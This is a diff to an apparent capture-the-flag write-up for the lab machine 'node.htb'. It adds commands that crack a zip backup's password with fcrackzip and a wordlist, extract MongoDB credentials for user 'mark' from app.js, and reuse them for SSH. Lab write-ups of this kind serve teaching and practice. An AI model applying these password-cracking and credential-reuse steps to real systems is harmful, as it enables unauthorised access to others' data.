@@ -64,14 +64,25 @@ Archive:  myplace.what
 [myplace.what] var/www/myplace/package-lock.json password:
 {% endhighlight %}
 
+{% highlight shell %}
+root@hack ~/Downloads# fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt myplace.what
+
+
+PASSWORD FOUND!!!!: pw == magicword
+root@hack ~/Downloads# unzip -P magicword myplace.what
+rock@hack ~/Downloads# head -n 11 var/www/myplace/app.js | tail -n 1
+const url        = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/myplace?authMechanism=DEFAULT&authSource=myplace';
+{% endhighlight %}
 
 `mark`...?
 `mark`.
-"Who is this `mark`"? I wondered. What boundries had you let him pass?
-Nevermind, I have his secret. ``
+"Who is this `mark`?" I wondered. What boundries had you let him pass?
+Nevermind. I had his secret, and he made a fatal mistake, leaving this behind.
 
-password via john - secret word
-backup_key = 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474
+{% highlight shell %}
+root@hack ~# ssh mark@node.htb
+{% endhighlight %}
+
 mark password for mongo: 5AYRft73VtFpc84k and ssh
 /var/scheduler/app.js > runs mongo tasks
 db.auth("mark","5AYRft73VtFpc84k")
